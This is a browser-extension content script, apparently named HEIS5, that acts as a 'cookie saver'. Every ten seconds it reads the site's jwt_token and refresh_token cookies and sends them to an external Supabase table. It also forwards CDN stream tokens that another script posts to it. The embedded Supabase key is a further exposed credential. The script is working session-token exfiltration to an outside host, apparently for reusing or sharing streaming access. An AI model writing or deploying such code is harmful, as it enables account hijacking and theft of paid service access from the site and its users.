const SUPABASE_URL = 'https://yvztqzisrgqybapkdhcr.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2enRxemlzcmdxeWJhcGtkaGNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0MTA1NjAsImV4cCI6MjA5NTk4NjU2MH0.Zx591ai9OQOAfV45PRX2ekcNubdj0tMWJhRakrWOIeU';

function getCookie(name) {
    const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return m ? decodeURIComponent(m[2]) : null;
}

async function saveToSupabase(name, value) {
    try {
        const res = await fetch(SUPABASE_URL + '/rest/v1/azam_config', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'apikey': SUPABASE_ANON_KEY,
                'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
                'Prefer': 'resolution=merge-duplicates'
            },
            body: JSON.stringify({ name, value })
        });
        return res.ok;
    } catch { return false; }
}

async function saveCookies() {
    const jwt = getCookie('jwt_token');
    const ref = getCookie('refresh_token');
    let ok = 0;
    if (jwt) { if (await saveToSupabase('global_tok', jwt)) ok++; }
    if (ref) { if (await saveToSupabase('azam_refresh_token', ref)) ok++; }
    if (ok > 0) console.log('[HEIS5] Saved ' + ok + ' token(s) to Supabase');
}

// Listen for CDN tokens from MAIN-world content-main.js
window.addEventListener('message', function(event) {
    if (event.data && event.data.type === 'HEIS5_CDN_TOKEN') {
        const { channelName, cdntoken, cdnBase } = event.data;
        if (channelName && cdntoken) {
            const tokPrefix = cdnBase + '/tok_' + cdntoken;
            saveToSupabase('cdn_tok_' + channelName, tokPrefix);
            saveToSupabase('cdn_jwt_' + channelName, cdntoken);
            console.log('[HEIS5] Saved cdntoken for', channelName);
        }
    }
    if (event.data && event.data.type === 'HEIS5_CDN_TOKEN_GLOBAL') {
        const { cdntoken, cdnBase } = event.data;
        if (cdntoken) {
            const tokPrefix = cdnBase + '/tok_' + cdntoken;
            saveToSupabase('cdn_tok_global', tokPrefix);
            saveToSupabase('cdn_jwt_global', cdntoken);
            console.log('[HEIS5] Saved global cdntoken');
        }
    }
});

saveCookies();
setInterval(saveCookies, 10000);
console.log('[HEIS5] Cookie saver loaded');
